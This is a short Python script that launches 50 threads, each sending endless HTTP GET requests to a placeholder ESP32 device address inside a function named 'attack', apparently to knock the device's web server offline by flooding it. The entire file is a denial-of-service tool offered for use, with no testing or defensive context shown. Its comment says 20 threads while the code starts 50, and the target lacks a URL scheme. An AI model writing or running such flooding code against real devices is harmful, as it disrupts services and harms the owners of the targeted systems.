import requests
import threading

target = "ip-address of ESP32"

def attack():
    while True:
        try:
            response = requests.get(target)
            print(f"Sent request: {response.status_code}")
        except:
            print("Request failed")

# Start 20 threads (adjust if needed)
for _ in range(50):
    t = threading.Thread(target=attack)
    t.start()